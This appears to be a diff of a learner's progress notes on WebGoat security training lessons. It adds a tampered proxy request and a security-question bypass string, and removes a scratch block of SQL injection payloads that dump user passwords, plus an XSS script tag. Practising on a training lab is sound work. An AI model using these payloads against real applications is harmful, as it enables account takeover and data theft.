@@ -13,6 +13,9 @@
 * intercept HTTP, get header and read the answer
 ### Http Proxies [x]
 * Intercept package, modify it to suite the task, make sure to modify properly the POST
+```
+/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily HTTP/1.1
+```
 ---
 ## Injection Flaws [ ]
 ### SQL Injeciton [x]
@@ -61,10 +64,15 @@ work in progress
 </comment>
 ```
 ---
-## Authentication Flaws
-### Authentication Bypass
-### JWT tokens (Under development)
-## Coss-Site Scripting (XSS)
+## Authentication Flaws [x]
+### Authentication Bypass [x]
+```js
+(secQuestion0=aORtrue)&(secQuestion1=aORtrue)&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
+```
+### JWT tokens (Under development) [x]
+* In development, therefore passed by default
+---
+## Coss-Site Scripting (XSS) [ ]
 ### Cross Site Scripting
 ## Access Control Flaws
 ### Insecure Direct Object References
@@ -90,27 +98,3 @@ work in progress
 ### Admin Password
 ### Without account
 ### Changing password
-```sql
-asd' or true union SELECT * FROM user_system_data;
-asd' or true FULL OUTER JOIN user_system_data as usd ON USERID = usd.USERID;
-```
----
-asd' or true; select * from user_system_data; --
-dave
----
-user_system_data
-SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'
-SELECT TABLE_NAME FROM <DATABASE_NAME>.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'
-SELECT TABLE_NAME FROM user_system_data.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'
-Smith' or '1'=1 union select userid, password, password, password from user_system_data'
-Smith' or '1'=1 union select userid, password, password, password from user_system_data --
-select * from users order by (case when (true) then lastname else firstname)
----
-# 2FA
-(secQuestion0=aORtrue)&(secQuestion1=aORtrue)&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
----
-#XSS
-<script>alert('my javascript here')</script>
----
-proxy
-/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily HTTP/1.1
